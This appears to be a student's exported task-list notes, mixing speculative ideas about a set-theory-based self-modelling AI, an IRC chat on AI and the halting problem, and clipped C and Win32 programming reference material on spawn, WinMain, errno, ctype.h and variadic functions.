ANN looks for transitive sets in concept space

Applications of countably computable nonwellfounded collections

CONVERGENCE IS FINDING A TRUE TRANSITIVE SET
LOGIC IS THE KEY
Function that takes string and maps to true/false if applicable
Know: my system does not allow one to collect everything of a certain type: only guaranteed in the mathematics section(which is set theory based)

Compression/ decompression theorems
&gt;MFW unraveling and raveling mean the same thing

Graph data on N^2 set 
Sub graphs
N choose 3

Machine work:
Connect syntax-&gt; semantics
In my case I am connecting strings to statements about mathematics/ operations on strings 



    TODO(LONG TERM)
I want something completely:
True
"Untouchable", non constructive proof
Counterintuitive, makes people uncomfortable
Modified halting problem:
Yes/no/unprovable
=Proof based machine cognition/neural networks for XP functions
ANSWER KING'S QUESTIONS
-money
-selling it to people 
-profitability 
Need to make play less fun than work!

&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
MACHINE
Ultimate goal for Machine:
Do what GEB did to me but instead
I (do what GEB did to me) to it 

Implement time stream by adding &lt;n,sequence,result&gt;
Ideas:
Internet is data
Google is search
--
Quine atoms can let us do category theory on stuff


Machine:
Quine atoms in one set, but normal atoms in another set. 
"Unraveling" theorem.
Ex: Sentence in "paragraph set" to it's words in "powerset of set of words"



Machine;
What direction goes where for information(explain what levels of info mean)


Machine rules:
Anti foundation axiom
Model itself+ other things
Epsilon-search/G Epsilon-search
Theorem generators (just look for true statements)



Warnings:
Due dates
Machine: don't get too caught up with the math
Material Goals:
&gt;create StdUniverse
&gt;create epsilon-search
&gt;create code injections for logic

G-search idea:
Doubly infinite strings then use them as search "material"
G(10111) gets to G(101113), etc...
Then make "poset search" 
So even if we don't have a Gset we have limited Gsearch

Story idea:
Machine god vs actual 
Machine is still missing the fruit of life 

CRAP I HAVE TO SHOW THAT MY NONWELLFOUNDED MODEL (Aczel+ Quine atoms) CONTAINS ZFC AS A SUBMODEL
"It's like a fractal, but in the logical space"
My model is self- similar at all points so just pick a place to call zero then start building up/down and assign meaning from there
2/28/16
What did I do?
I think I defined something self evident?
Def: X is ---- iff X^any statement is true 
Then construct G s.t. G satisfies the above definition 
Then G^ "is G ----?" Will result in true and then it is a self evident property
(Assuming my nonwellfounded structure + other properties)

Idea: Anna searches through Internet for answers

"Limit points of information"
|Web page
||Text vs ads
|||actual content, etc
||||.....&gt; but they're still level 1 information
Level 2 info:
|info about web pages
||info about Text/images on web pages
|||info about content on web pages
||||....&gt; then this is level 2 information 


OMFG just change the scope and I'm still right.
Life is fun again. 2/26/16
Problem is I "transposed" my idea from N to P(N) and it's not guaranteed to have an answer anymore 

god set G:
X^(G) true &lt;=&gt; X true for all "logic systems"

Admit the existence of God =&gt; constructing a portion of Him???
-when did I get religiously motivated?

ATP: autonomous theorem prover
DNA: dynamic number analysis

WTF: after that nap I got angry again for some reason then got super exhausted


Concept space:
Every concept is in this space
&gt;Equipped with a search function:
Goal is efficient search for a proof of statement X

Plan:
7th grade model + give it reading comprehension


Machine 
Work on generating theorems/rewriting things?
How to compound level 1 Syn-&gt; Sem function to generate the rest?


Logic plan:
Create parsing algorithm
Define:
-epsilon search
-logical connectives

Middle school question:
Did I really understand?
No b/c algorithm doesn't adapt

Epsilon search:
Make an index of 
-Element:set name 
Then list all of the elements in lexicographic order
PROBLEM:
How to search StdUniverse??????
PROBLEM:
we have a "well-ordering" from Syntax-&gt; Semantics. This is a problem because if we have uncountably many truths then we just have a function restricted to some weird countable set mapping itself to the Reals
SOLUTION IDEA:
Maybe we can use non-well-founded-ness to construct an element inside our set that is 'not countable' to show that we are also mapping uncountable to uncountable


MACHINE:
Need type-token distinction 
Multiple negation theorem:
X is Y =&gt; one of the negations must be false
For a multiple argument proposition 


MACHINEWORK=====================
AFA: anti foundation axiom
&gt;Quine atoms X={X}

So I need instructions for a computer inside StdUniverse

0. Mess with Latex: [use Latex for advanced math symbols]
1. Insert definitions and stuff into stdUniverse
2. How to deal with data using An?
Text -converted to actions-&gt; ????

Statement&gt;formula is hard because of "is" multiple definition

Latex pipeline:
&lt;&gt;.tex-&gt; latex &lt;&gt;.tex -&gt; &lt;&gt;.dvi -&gt; xdvi &lt;&gt;.dvi

Use below definition for formulas for now 
P(X)= X is a natural number
P(0)= 0 is a natural number

Running AnnA.exe
[new method is run AnnA, then work on the copy of itself inside StdUniverse.txt]
&gt;turn on An.exe
&gt;An.exe reads standard universe.txt,basic logic.txt, and experience.txt
&gt;An.exe turns on nA.exe
&gt;nA.exe reads its own version of what An reads

&gt;then start to eval stuff
&gt;&gt;ask questions, etc
&gt;&gt;&gt;consistency/simple one step proof questions

^^^^^^^^^^^^^^^^^^^^^^^^^
STEP 1:
Build logic model
-standard universe.txt
-basic logic
-&gt; =,^,v,negation, implication, double implication, &lt;alias function&gt;
-&gt; binary relation definitions(reflexive, symm,etc)
-give it Peano axioms
-&gt; deal with special characters
-&gt; deal with quantifiers
-&gt; domain/scope of a function
-&gt; deal with the different objects in the system
-modified ZFC(with different foundation axiom because hyper sets)

Proof inputs:
&gt;fund. Thm. Of Arith
&gt;modulo stuff
&gt;division algorithm proof
&gt;Euclid's algorithm
&gt;+,- operations

=&gt; NEED EFFECTIVE POWERSET SEARCH ALGORITHM
===&gt;lexicographic order then look in that "block"

Rules/knowledge are in text, [movements in code ?]

Idea: we are all equal in the concept space (if my model is good enough LOL)

Computable set theory?
Standard universe={axioms, Lemmas/proofs, functions, inference rules, true set, false set}
-where are variables/hypothetical concepts?
-define set and set actions
Set:
"Name"{domain|(OR :)predicates/defining features/inheritances from other set structures}

Eval: pick CNF
A^B means look if A and B are in true set, then return true
==&gt;fuck do I have to exhaust the true set??
==&gt;there should be a specific place for all ideas
-if not, "use replacement" to look for a different equation, 
Etc,etc

Need:
&gt;Logic model
&gt;Experience model
-makes choices based on past info
-take past info&gt;"apply" it now&gt; make a decision 
-take past info = "pattern recognition"
-&gt; how many kinds of patterns exist in a sequence? In an n x n grid?
-&gt; how to find patterns?
&gt;English model
&lt;which I already kinda started on but didn't finish R I P&gt;

What is most basic mental model???
???????????????????
Universe(physics "engine")
Basic logic, ^,v, not,~

Want:
Dynamic intelligence
Need to make it move properly
&lt;Bootstrap problem&gt;
Need to know:
-inner models
-take data set and generalize

How to store powerset data???
What about permutations?

Experience:
Time structure
-raw data
Mental structure
-"organized data"

How to be dynamic?
-draw its own conclusions???
How to recurse properly?
-what you move is NOT yourself, but the copy inside
Me-An-nA
F:Syntax-&gt;Semantics
I send command-&gt;An processes metainfo then sends appropriate command -&gt;nA then computes what An sent

G:Semantics-&gt;Syntax
nA-An-Me
nA has an idea-&gt; An gets appropriate sentence structure to fill-&gt;sends it as text output

Truth value of mathematics and metamathematics
Visual data analysis has an advantage over symbolic logic?

Approximate answer:
&gt;data types (sets)
&gt;finitary logic
&gt;feed into experience 

Feeling:
People can accurately take the limit of any single string but choosing the string comes from experience:
So go higher in power sets to compute reals:
P(R)
^
N-&gt; R
Instead and we can compute closed/open sets

Reduce truth to set membership

Plan:
-&gt; RPI antivirus
-&gt; string library for my purposes
-&gt; dictionary API
----&gt; define the 10000 most common English words
----&gt; LEARN BY USAGE NOT BY DICTIONARY
----&gt; know idioms?

(2)unprovable=axiomatic


Logic systems aren't built to handle axiomatic sentences

Universe of sentences U
in (1), there are only two types of sentences:
1. provable (decidable)
2. axiomatic

in other logic systems, there is a third implicit category:
axiomatic but *not* within the system
====unprovable(at is, outside the logic system and axiomatic)====
Logic systems aren't built to handle axiomatic sentences

This is where hofstadter comes along. His intuition leads him to believe that logic systems that can deal with the third kind of category are sentient (or can exhibit sentient-like behavior) and that is in fact what we do every day: we evaluate sentences/information that is axiomatic and not within our logic.

&lt;RPC&gt; I think his argument (potential BS coming up) is that AI requires 'recursive' thinking
&lt;RPC&gt; and to separate the 'I' from the environment
&lt;RPC&gt; from there motive can be created
&lt;RPC&gt; that's the simple part
&lt;SpongeJr&gt; so far sounds pretty spot on from what I've gotten
&lt;SpongeJr&gt; ah, ok
&lt;RPC&gt; personal opinions to this approach:
&lt;RPC&gt; I feel that it's lacking something, like a nondeterministic factor
&lt;RPC&gt; because due to Halting Problem
&lt;RPC&gt; if you have an AI that's trying to solve something, it has the potential of never halting
&lt;SpongeJr&gt; yeah, I see where you're going with that I think, but
&lt;RPC&gt; so you add a black box that randomizes the AI and when it will start/stop end, etc
&lt;SpongeJr&gt; there's an executive program that would allocate resources and say, "I've spent too much energy on this and I still haven't _____, so branch off and do this..."
&lt;SpongeJr&gt; ahhh, yeah I think that you're right with the randomization
&lt;RPC&gt; and then if you want it to interact with the world, you put in a copy of physics in it, and then give it senses and stuff [also give it scientific method for solving problems, this is where nondeterminism plays a part]
&lt;RPC&gt; and then just let it go
&lt;SpongeJr&gt; I think a source of "noise" might be important
&lt;RPC&gt; but it doesn't have a motive
&lt;RPC&gt; so just imprint some kind of 'energy wanting' stuff
&lt;RPC&gt; and then due to randomness it might like arts or math or something
&lt;RPC&gt; and then just let things work
&lt;Atarlost&gt; An asynchronous neural net has inherent noise.
&lt;SpongeJr&gt; ok, well...
&lt;RPC&gt; ^^^ my phd thesis right there :P

These functions create and execute a new child process, named by path or file (depending on the form of the function used). 
The value of mode determines how the program is loaded, and how the parent program will behave after the child program is initiated.

P_WAIT
The child program is loaded into memory and executed, and then the parent program resumes execution.
P_NOWAIT
Causes the parent program to execute concurrently with the new child process.
P_NOWAITO
Causes the parent program to execute concurrently with the new child process. The wait() function cannot be used to obtain the exit code.
P_OVERLAY
The child program replaces the parent program in memory and is executed. No return is made to the parent program.

The various forms of the spawn functions are:

The l form : These contain an argument list, terminated by a NULL pointer. The argument arg0 should point to a filename that is associated with the child program.
The v form : These contain a pointer to an argument vector. The value in argv[0] should point to a filename that is associated with the child program. The last member of argv must be a NULL pointer. The value of argv cannot be NULL, but argv[0] can be a NULL pointer if no argument strings are passed.
The p form : These use paths listed in the PATH environment variable to locate the program to be loaded, provided certain conditions are met.
The e form : These pass a pointer to a new environment for the child program. The argument envp is an array of character pointers to null-terminated strings. The array of pointers is terminated by a NULL pointer. The value of envp cannot be NULL, but envp[0] can be a NULL pointer, if no environment strings are passed.

////////////////////////////
// Introduction:
// Basic Windows Program!
//
// This package demonstrates how to build a very basic Windows application
// on a Win O/S system from Windows 3.1 to Windows XP using C++ code.
//
// * Prerequisites to understanding this program:
//     - Already understand how to create Console applications in C++.
//     - Full understanding of C FUNCTIONS, FUNCTION PARAMETERS/ARGUMENTS.
//
// If you don't know what those are, go learn what
// they are before going on reading this!
//

///////////////////
// OVERVIEW:
// Windows applications in C++ are easy!
// To understand them, you must first see the big
// picture.  Then you can get your hands dirty
// and get right into the code.

///////////////////
// Big picture.
//
// Windows apps are much different than console apps.
// A console app, (which you probably are used to)
// has just a single "main" function called main().

// Every Windows app has __2__ functions that are very
// important to it.

// These 2 functions are WinMain and WndProc.  WinMain
// and WndProc really form the Windows' app's heart and soul.
//
//    A.  WinMain:  Application STARTING POINT.  REPLACES
//                  main() function that you might be used to
//                  from regular C/C++ programs.
//
//    B.  WndProc:  A function that PROCESSES MESSAGES from
//                  the Windows O/S as they come in.
//

///////////////////
// BUT what's a MESSAGE???
//
// The idea of "messages" takes some getting used
// to, but it is really a simple concept.
//
// The Windows Operating system is like a GOVERNMENT.
//
// All of the little windows that live inside
// (the Firefox window, the MSWord window,
// and YOUR PROGRAM's window!) are people owned
// by the Windows GOVERNMENT.
//
// So, whenever the user attempts to interact
// with ANY program window inside that Windows Government,
// either by clicking on your window, or by pressing a key
// while your program has the "input focus" (when
// your window is "selected"),
// the Windows O/S INTERCEPTS that communication FIRST.
//
// THEN, a fraction of a second later, (almost
// instantly), the Windows O/S SENDS A a "MESSAGE"
// to YOUR Window program that "HEY! THE USER
// CLICKED ON YOU AT LOCATION (22, 405), USING
// THE RIGHT MOUSE BUTTON."  or "HEY!  THE
// USER PRESSED THE 'A' KEY, AND HE WAS ALSO HOLDING
// DOWN SHIFT WHILE HE PRESSED IT."

// THAT is what a MESSAGE is.  Its a notification
// from the Windows O/S that the user has
// done something to your program's window.

// ONCE your program receives this
// "MESSAGE", your program can THEN execute some code
// in response to that particular MESSAGE.

// The WndProc function will contain ALL of
// your "MESSAGE HANDLING CODE" -- that is,
// the code pieces that you want executed
// when certain window events happen.

// This is called EVENT DRIVEN PROGRAMMING.
// And in most standard Windows applications, this is
// how things happen.

// Most of a basic, standard Windows application's
// time is spent WAITING for events.

// And that is what a message is!

//////////////////////////////
// OF INSTANCES AND HANDLES.
//
// There are 2 concepts you must understand intuitively first
// before diving into Windows programming.

// Those concepts are the concept of an INSTANCE,
// and the concept of a HANDLE.

///////////////
// INSTANCES:
// The first concept is the concept of an INSTANCE of a program.

// What's an INSTANCE?

// An INSTANCE of an application is just one running OCCURRENCE of it.
// If you open up 3 different NOTEPAD.exe windows, then you have
// created __3__ different, separate INSTANCE of the NOTEPAD program
// inside your Windows Kernel.

// If you're familiar with OOP, an easy explanation is this:
    // PROGRAM CODE &gt;&gt; like a C++ class definition.
    // ACTUALLY RUNNING PROGRAM CODE &gt;&gt; like an "instance" of the class, this is an INSTANCE of the program.


///////////////
// HANDLES:
// HANDLES pop up EVERYWHERE in Windows programming (and all other
// types of programming as well!)  So I'm hoping to explain the idea
// behind a HANDLE intuitively, so that you have something to "hold onto"
// whenever you see use of HANDLES in program code.

// Think about a POT of boiling water.  Inside that pot is
// some corn on the cob being cooked.

// Now, say you want to ACCESS the pot, so you can dump its
// contents out into the sink and drain the corn.

// How do you do that?  Do you GRAB THE POT DIRECTLY??? NO!!
// That would be stupid.  Instead, you grab the HANDLE TO THE POT.
// Using the HANDLE to the pot, you manipulate the pot, slowly
// dumping out the water and leaving the corn behind.  Then you
// eat the corn and it is delicious.

// Now, in programming, the idea of a HANDLE is much the same.
// A HANDLE to a WINDOW is __NOT__ the window itself in an application
// variable.  Instead, it is a POINTER TO, A REFERENCE TO the
// window itself.

// A HANDLE TO AN INSTANCE in an application variable is NOT
// the application INSTANCE itself.  Rather, it is a POINTER TO
// that application instance.  The application instance exists
// somewhere in the Windows O/S's program memory.  You use the
// programmatic HANDLE that you have as YOUR MEANS TO MANIPULATE
// AND DEAL WITH that application instance.

// The benefits of HANDLES are many!  You'll see as we go on.
// Onto WinMain()!

////////////////////////////
// In a C++ Windows app, the starting point is WinMain().
int WINAPI WinMain( HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is the "handle" to YOUR PROGRAM ITSELF.  More in the GLOSSARY at the bottom.
                    HINSTANCE hPrevInstance,// USELESS on modern windows (totally ignore hPrevInstance)
                    LPSTR szCmdLine,        // Command line arguments.  Explained near BOTTOM of this file.
                    int iCmdShow )          // Start window maximized, minimized, etc.
{
    // As we said before, WinMain is the application starting point.

    // A:  WinMain does 2 main things:
    //    1.  STARTUP STUFF:  CREATE THE WINDOW ITSELF, AND LOAD IT UP
    //        SO IT APPEARS ON THE SCREEN.
    //
    //    2.  KEEP CHECKING WITH WINDOWS O/S TO SEE IF THE USER
    //        HAS INTERACTED WITH THE APPLICATION ("MESSAGE LOOP")
    //        If the user has clicked on anything, or pressed any keys while
    //        our window is ACTIVE (our window has the "input focus")
    //        then we are to DISPATCH a MESSAGE to WndProc (make
    //        a function call to WndProc) that tells

// HINSTANCE:  "Handle" to an instance.  Every running INSTANCE
// of an application has a handle to it that is YOUR MEANS
// by which to manipulate, talk about, or refer to that specific
// application instance as it exists inside the Windows O/S.

// What's an instance again?  If you have 2 copies of the same programming running
// at the same time, then you are running 2 INSTANCES
// of the same program (2 copies of Microsoft Word, for example).
// Each INSTANCE of a program has its own INSTANCE HANDLE and
// hence its PID (ProcessID - unique integer identifier
// for each program that is currently running in the Windows O/S)
// and its own entry in the Window task manager.

// TRY THIS:  Press CTRL+ALT+DEL to bring up the Windows
// Task Manager.
    // Now switch to the PROCESSES tab.
    // Click the "IMAGE NAME" column, so that everything gets organized by name of the process.
    // Now, open NOTEPAD, 3 times.  You should have 3 Notepad windows open.
    // NOW, LOOK AT the Windows Task Manager.  Try to locate __3__ entries
    // that say NOTEPAD.EXE.  Open a fourth notepad.  Open a fifth notepad.
    // every instance of notepad you open gets its own entry in that table.

// Now HINSTANCE is exactly what it sounds like . . its a "handle"
// (a means by which to access or control) the INSTANCE of your
// program.
//
// The actual INSTANCE of your application lives inside the Windows O/S.
// But you have a HANDLE TO IT, and your HANDLE to it is your means
// by which to manipulate it, refer to it, change it, or delete it.

// HWND:  HANDLE TO A WINDOW.  This is exactly the same in CONCEPT as
//        the INSTANCE HANDLE, but now, this is a handle TO THE WINDOW ITSELF.
//        The HANDLE TO THE WINDOW is your means by which to change
//        manipulate, or refer to the window that belongs to your program.
//        A single INSTANCE of an application can have MULTIPLE window
//        handles associated with it.  THAT IS WHY when you CREATE A WINDOW,
//        using the CreateWindow() function, you MUST PASS the hInstance
//        parameter.  That is so that Windows knows which application
//        INSTANCE is attached to which WINDOW.
//
// HDC:  HANDLE TO A DEVICE CONTEXT.  Hmm.  I'm not going to explain this
//       in detail here, because we're not really using the HDC much
//       in this example.  Perhaps at a later time.


///////////////////////////
// THERE, ALL DONE - CLOSING NOTES.
// Everyone knows starting Windows Programming can be a bit hard.
// There are a few things I'd like to highlight here.
//
// Now you might be wondering, "ok, if WinMain is the application
// starting point, WHERE / WHEN / HOW does WinMain accept
// PARAMETERS?"
//
// To understand this, you must start to see your "Windows program"
// as really just a FUNCTION that Windows will call, when it is
// time to start up your application.
//
// So where do the values of hInstance, hPrevInstance, szCmdLine
// and iCmdShow come from?
// These parameters are PASSED BY the Windows O/S AT APPLICATION START TIME.
// So all of hInstance, hPrevInstance (which is always passed as NULL)
// szCmdLine and iCmdShow are passed by the Windows O/S
// to your application.

////////////////////
// Understanding what szCmdLine is and does:
//
// Do me a favor.
// Open the Windows command prompt (go to START-&gt;Run,
// then type "cmd" in the box that appears there.)
//
// You should see a black console window, like the one that your basic console C++
// apps run in.  In the black window, type in:
//          explorer
// then press enter.

// What should happen is your windows file explorer should pop up.

// Now go back to the command prompt and type in
//          explorer "C:\Program Files"

// Notice now that the Windows disk explorer now opens in the folder "C:\Program Files"
// In the above example, "C:\Program Files" is a command line argument that modifies
// the behaviour of the disk explorer upon its launch.

// So the explorer.exe program is a Windows program.
// And szCmdLine WOULD BE WHERE YOU TAKE that extra string
// that is passed to the program at the time the program is
// launched.

// You won't necessarily use this at all in your programming!
// But, it is good to know.


// REFERENCES:
// If you want to know more about Windows Programming
// in this CLASSIC C++ way, then you should pick
// up a copy of Charles Petzold's "Programming Windows,
// 5th Edition"
// http://www.charlespetzold.com/pw5/
// On Amazon:  http://www.amazon.com/exec/obidos/ISBN=157231995X

// "The Petzold" is THE reference that all the game
// books out there (some of which are pretty good!)
// draw on when they write their Win32 chapter (its
// obvious from the way they've written them!)

// What's annoying is, a lot of the people who write
// those books though, never acknowledge Petzold or
// mention where they derived their Win32 understanding
// from.

// So, the Petzold is where I got my initial understanding
// anyway, and its really good.  Check it out
// from your library if you haven't the $.

////////////////
// MORE Closing notes:
// This is sometimes called "EVENT DRIVEN
// PROGRAMMING" -- the idea is that your
// program is entirely driven by EVENTS.
// If there are no events, then your
// Windows program DOES NOTHING.

// Note that this is NOT the case with GAMES!
// GAMES CAN'T WAIT!  Games must be fast.
// For games, you would use DirectInput,
// and things like that, and you WOULD NOT
// be WAITING for messages.  Instead,
// you want to be DIRECTLY listening
// at the keyboard and mouse for user
// interaction with those DEVICES.


///////////////////
// You MIGHT HAVE been wondering about
// the apparent RETURN TYPE of WinMain and
// WndProc.

// Looking at those function prototypes, we have:

/*

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow );
LRESULT CALLBACK WndProc( HWND hwnd, UINT message, WPARAM wparam, LPARAM lparam );

*/

// For example, a question you might have might be:
// WHY is the return type of WinMain "int WINAPI"?
// That is so weird.

// The short answer, is ITS NOT!!

// The return type of WinMain is just INT.
// "WINAPI" IS NOT PART OF THE RETURN TYPE
// OF THE WinMain FUNCTION!

// The second word after the return type
// (WINAPI) is called the CALLING CONVENTION of
// the function.

Calling perror will give you the interpreted value of errno, which is a thread-local error value written to by POSIX syscalls (i.e., every thread has it's own value for errno). For instance, if you made a call to open(), and there was an error generated (i.e., it returned -1), you could then call perror immediately afterwards to see what the actual error was. Keep in mind that if you call other syscalls in the meantime, then the value in errno will be written over, and calling perror won't be of any use in diagnosing your issue if an error was generated by an earlier syscall.

fprintf(stderr, ...) on the other-hand can be used to print your own custom error messages. By printing to stderr, you avoid your error reporting output being muxed with "normal" output that should be going to stdout.

Keep in mind that fprintf(stderr, "%s\n", strerror(errno)) is similar to perror(NULL) since a call to strerror(errno) will generate the printed string value for errno, and you can then combined that with any other custom error message via fprintf.</COMMENTS></TASK><TASK ID="127" TITLE="fopen" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42331.00000000" STARTDATESTRING="11/23/2015" CREATIONDATE="42331.68896991" CREATIONDATESTRING="11/23/2015 4:32 PM" LASTMOD="42332.50756944" LASTMODSTRING="11/24/2015 12:10 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000"><COMMENTS>http://www.cprogramming.com/tutorial/cfileio.html

4.1 Classification of Characters

This section explains the library functions for classifying characters. For example, isalpha is the function to test for an alphabetic character. It takes one argument, the character to test, and returns a nonzero integer if the character is alphabetic, and zero otherwise. You would use it like this:

if (isalpha (c))
  printf ("The character `%c' is alphabetic.\n", c);

Each of the functions in this section tests for membership in a particular class of characters; each has a name starting with ‘is’. Each of them takes one argument, which is a character to test, and returns an int which is treated as a boolean value. The character argument is passed as an int, and it may be the constant value EOF instead of a real character.

The attributes of any given character can vary between locales. See Locales, for more information on locales.

These functions are declared in the header file ctype.h.

Function: int islower (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a lower-case letter. The letter need not be from the Latin alphabet, any alphabet representable is valid. 

Function: int isupper (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is an upper-case letter. The letter need not be from the Latin alphabet, any alphabet representable is valid. 

Function: int isalpha (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is an alphabetic character (a letter). If islower or isupper is true of a character, then isalpha is also true.

    In some locales, there may be additional characters for which isalpha is true—letters which are neither upper case nor lower case. But in the standard "C" locale, there are no such additional characters. 

Function: int isdigit (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a decimal digit (‘0’ through ‘9’). 

Function: int isalnum (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is an alphanumeric character (a letter or number); in other words, if either isalpha or isdigit is true of a character, then isalnum is also true. 

Function: int isxdigit (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a hexadecimal digit. Hexadecimal digits include the normal decimal digits ‘0’ through ‘9’ and the letters ‘A’ through ‘F’ and ‘a’ through ‘f’. 

Function: int ispunct (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a punctuation character. This means any printing character that is not alphanumeric or a space character. 

Function: int isspace (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a whitespace character. In the standard "C" locale, isspace returns true for only the standard whitespace characters:

    ' '

        space
    '\f'

        formfeed
    '\n'

        newline
    '\r'

        carriage return
    '\t'

        horizontal tab
    '\v'

        vertical tab 

Function: int isblank (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a blank character; that is, a space or a tab. This function was originally a GNU extension, but was added in ISO C99. 

Function: int isgraph (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a graphic character; that is, a character that has a glyph associated with it. The whitespace characters are not considered graphic. 

Function: int isprint (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a printing character. Printing characters include all the graphic characters, plus the space (‘ ’) character. 

Function: int iscntrl (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a control character (that is, a character that is not a printing character). 

Function: int isascii (int c)

    Preliminary: | MT-Safe | AS-Safe | AC-Safe | See POSIX Safety Concepts.

    Returns true if c is a 7-bit unsigned char value that fits into the US/UK ASCII character set. This function is a BSD extension and is also an SVID extension. </COMMENTS></TASK><TASK ID="139" TITLE="multiple file pointers" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42332.00000000" STARTDATESTRING="11/24/2015" CREATIONDATE="42332.49005787" CREATIONDATESTRING="11/24/2015 11:45 AM" LASTMOD="42332.49025463" LASTMODSTRING="11/24/2015 11:45 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0" SUBTASKDONE="0/1"><COMMENTS>http://forums.codeguru.com/showthread.php?486774-Two-file-pointers-to-same-file

you can have as many file handles as you want. As long as all you're doing is reading and no writing is happening (from you or another program) there's no problem.

If writing is happening meanwhile, then you need to account for possible changes happening to the file you're working in. This is no different than having only one file handle and having other programs change the file meanwhile. The easy way out is typically to open the file in shareDenyWrite mode. </COMMENTS><TASK ID="142" TITLE="http://stackoverflow.com/questions/21796921/if-two-file-pointers-point-to-the-same-file-is-closing-one-of-them-enough" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42332.00000000" STARTDATESTRING="11/24/2015" CREATIONDATE="42332.50328704" CREATIONDATESTRING="11/24/2015 12:04 PM" LASTMOD="42332.50337963" LASTMODSTRING="11/24/2015 12:04 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>

I am reading the chapter on arrays and pointers in Kernighan and Richie's The C Programming Language.

They give the example:

/* strlen:  return length of string s */
int strlen(char *s)
{
    int n;

    for (n = 0; *s != '\0'; s++)
        n++;
    return n;
}

And then say:

“Since s is a pointer, incrementing it is perfectly legal; s++ has no effect on the character string in the function that called strlen, but merely increments strlen’s private copy of the pointer. That means that calls like

strlen("hello, world");  /* string constant */
strlen(array);           /* char array[100]; */
strlen(ptr);             /* char *ptr; */

all work.”

I feel like I understand all of this except the first call example: Why, or how, is the string literal "hello, world" treated as a char *s? How is this a pointer? Does the function assign this string literal as the value of its local variable *s and then use s as the array name/pointer?</COMMENTS><METADATA selected="1"/></TASK><TASK ID="36" TITLE="https://en.wikipedia.org/wiki/C_string_handling" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42317.00000000" STARTDATESTRING="11/9/2015" CREATIONDATE="42317.58596065" CREATIONDATESTRING="11/9/2015 2:03 PM" LASTMOD="42331.65768519" LASTMODSTRING="11/23/2015 3:47 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"/><TASK ID="123" TITLE="http://www.cprogramming.com/tutorial/c/lesson17.html" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42331.00000000" STARTDATESTRING="11/23/2015" CREATIONDATE="42331.65769676" CREATIONDATESTRING="11/23/2015 3:47 PM" LASTMOD="42331.65793981" LASTMODSTRING="11/23/2015 3:47 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000"><COMMENTS>www.cprogramming.com/tutorial/c/lesson17.html

Perhaps you would like to have a function that will accept any number of values and then return the average. You don't know how many arguments will be passed in to the function. One way you could make the function would be to accept a pointer to an array. Another way would be to write a function that can take any number of arguments. So you could write avg(4, 12.2, 23.3, 33.3, 12.1); or you could write avg(2, 2.3, 34.4); The advantage of this approach is that it's much easier to change the code if you want to change the number of arguments. Indeed, some library functions can accept a variable list of arguments (such as printf--I bet you've been wondering how that works!).



Whenever a function is declared to have an indeterminate number of arguments, in place of the last argument you should place an ellipsis (which looks like '...'), so, int a_function ( int x, ... ); would tell the compiler the function should accept however many arguments that the programmer uses, as long as it is equal to at least one, the one being the first, x.

We'll need to use some macros (which work much like functions, and you can treat them as such) from the stdarg.h header file to extract the values stored in the variable argument list--va_start, which initializes the list, va_arg, which returns the next argument in the list, and va_end, which cleans up the variable argument list.

To use these functions, we need a variable capable of storing a variable-length argument list--this variable will be of type va_list. va_list is like any other type. For example, the following code declares a list that can be used to store a variable number of arguments.

va_list a_list; 

va_start is a macro which accepts two arguments, a va_list and the name of the variable that directly precedes the ellipsis ("..."). So in the function a_function, to initialize a_list with va_start, you would write va_start ( a_list, x );

int a_function ( int x, ... )
{
    va_list a_list;
    va_start( a_list, x );
}

